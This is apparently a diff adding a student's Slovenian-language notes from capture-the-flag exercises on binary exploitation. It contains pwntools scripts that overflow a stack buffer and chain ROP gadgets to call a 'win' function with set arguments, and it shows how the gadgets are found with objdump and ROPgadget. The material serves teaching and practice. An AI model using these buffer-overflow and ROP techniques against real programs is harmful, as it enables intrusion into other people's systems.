@@ -1,0 +1,159 @@
+PWN 3
+from pwn import * 
+
+p = gdb.debug ('./main', 'b * main')
+
+payload = b'A' * 32 #zafilamo buffer
+
+payload += b'B' * 8 # base pointer, (nimamo canarya za ta primer)
+
+payload += p64(0x402ea5)
+
+p.sendline(payload)
+
+p.interactive()
+
+
+tko naredimo preprosto k smo ze na prejsnih vajah
+
+poglejmo kaj je win da vidmo te ife za deadbeef
+
+objdump -d main | grep '<win>' -A 30
+
+vidmo cmp med rax in 0xdeadbeef
+
+v rax je eax, v eax je ax, v ax pa ah in al
+
+0xdeadbeef damo v eax, ker ne rabi 64bit ampak 32bit(eax), ker je 0xdeadbeef 32bit
+pol pa rax primerjamo z odmikom od rbp -> zakaj? rbp je na zacetku bufferja postavlen, stack pointer na koncu (to ze vemo)
+
+vidmo da iz rdi in rsi nalozijo podatki na odmik od rbp-ja. to so standardni registri za argumente (a in b v sami funkciji).
+
+zato hocmo rdi nastavt na 0xdeadbeef, rsi pa na 0xbadc0ffee (ker s temi vrednosti argumentov bomo dobil You win!)
+
+klical bomo snippete kode (return oriented programming), in temu recemo rop gadget
+
+ROPgadget --binary main //ukaz
+ROPgadget --binary main | grep 'pop rdi' //snippeti da loh skacemo naokrog dobimo
+
+ok torej mamo leave (pop $rbp, da kar je na vrhu stacka v $rbp in nastavi stack pointer na return address zdej kaze ker smo popal) in ret ( pop $rip, vrne kar je na vrhu stacka in shrani v $rip). Pop spremeni vzame iz stack in vrne kamor napisemo 
+
+torej ta gadget hocmo sprement:(ta snippet kode, vidimo z objdump -d main | grep '<win>' -A 30, da je to na naslovu 0x40e8bd:
+pop $rdi
+pop $rbp
+ret -> pop $rip
+
+tole je zdj stanje:
+
+laeve -> pop $rbp
+ret -> pop $rip
+-------------to zgori je main----
+pop $rdi
+pop $rbp
+ret -> pop $rip
+------tole je pa 0x40384d----
+
+tako bomo mel neke AAAA-je in se bo pol stack pointer gor dvignu z pop in grejo v $rbp, pol bo sel ret in hocmo dat notr nas 0x40384d (nas adget) in bo dvignu gor stack pointer
+in pol k se klice pop $rdi hocmo nasopat 0xdeadbeef notr in se dvigne stack pointer n pol pop $rbp bo pol v $rbp dal notr neke C-je.
+
+rabmo se en gadget za badcofee
+
+grepimo kje se uporabi "pop rsi"
+
+nov gadget na 0x4038ba:
+pop $rsi //hocmo bad coffee
+pop $rbp
+ret -> pop $rip
+
+torej zdej rabmo k se popa od C-jev dat notr v ret 0x403b8a, stack pointer se dvigne, pol se klice pop $rsi, hocmo notr dat 0xbadc0ffee, stack pointer gor, klice se pop $rbp, notr dejmo D-jeee in ko se dvigne gor in klice ret, hocmo v $rip met notr win)
+
+
+stack:
+win (ret) -> to se bo na koncu, argumente smo nastavl (a in b sta ta rdi in rsi) in gremo v win s temi arguenti
+DDDDDD (rbp)
+0xbadc0fee (rsi)
+0x403b8a (ret)
+CCCCCCCC (rbp)
+0xdeadbeef (rdi)
+0x40e8bd (ret)
+BBBBBBB (rbp)
+AAAAAAA <- sp kle kaze na zacetku in pol se dviguje gor z vsakim pop!
+
+from pwn import * 
+
+p = gdb.debug ('./main', 'b * main')
+
+payload = b'A' * 32 #zafilamo buffer
+payload += b'B' * 8 # base pointer, (nimamo canarya za ta primer)
+payload += p64(0x40384d) #ret povozimo z nasim gadgetom, ki bo laufu pop rdi; pop rbp; ret
+payload += p64(0xdeadbeef)
+payload += b'C' * 8
+payload += p64(0x403b8a) #v nas tadrug gadget z rsi-jem: pop rsi; pop rbp; ret
+payload += p64(0xbadc0ffee)
+payload += b'D' * 8
+payload += p64(0x402ea5) #win address
+
+p.sendline(payload)
+
+p.interactive()
+
+
+
+kodaaaa ------
+
+
+kaj pa če bi loh sam skočl na You win! torej bi skipal ife
+
+objdump -d main | grep '<win>' -A 30 //poglejmo kodo. vidmo da win ma dva putsa, hocmo taprvga dobit, torej rabmo mal visje gor it, da se rax v rdi izvede ( rdi je argument in puts uporabi ta argument) se eno visje je pa lea (ki nalozi v rax notr to kodo). torej rabmo na lea it (direkt pod jumpom ,ki ga hocmo skipat (ker to je v primeru da if ni izpolnjen ta jump)).
+
+0x402ed0
+
+from pwn import * 
+
+p = gdb.debug ('./main', 'b * main')
+
+payload = b'A' * 32 #zafilamo buffer
+payload += b'B' * 8 # base pointer, (nimamo canarya za ta primer)
+payload += p64(0x402ed0) #ret povozimo z nasim gadgetom, ki bo laufu pop rdi; pop rbp; ret
+#payload += p64(0xdeadbeef)
+#payload += b'C' * 8
+#payload += p64(0x403b8a) #v nas tadrug gadget z rsi-jem: pop rsi; pop rbp; ret
+#payload += p64(0xbadc0ffee)
+#payload += b'D' * 8
+#payload += p64(0x402ea5) #win address
+
+p.sendline(payload)
+
+p.interactive()
+
+---nova koda-----
+
+
+PWN 6
+
+rabmo gadget za rsi
+
+pogledamo in najdemo enga z rsi in ret
+
+problem k smo basepointer dal na samo B-je, ker za funkcijo se rbp presavi na rsp, rsp pa odspodi. pol za vračanje se pa basepointer nastavi na prejnš basepointer, stack pointer pa na tja kjer je basepointer bil. Pri leave se nastavi base pointer. fora je da mi smo cist zgresil tam k se basepointer in stack pointer nastavita (na zacetku win funkcije) in mamo polomljen!!!.
+
+ne bo slo tako lepo. bo treba v if tudi:
+
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+payload = b'A' * 64
+payload += b'B' * 8
+payload += p64(0x4038ad) # pop rdi; pop rbp; ret
+payload += p64(0xdeadbeef)
+payload += b'C' * 8
+payload += p64(0x423e9e) #pop rsi; ret
+payload += p64(0x1337c0de) #rsi
+payload += p64(0x402ee5) #win
+
+p.sendline(payload)
+
+p.interactive()
+
+
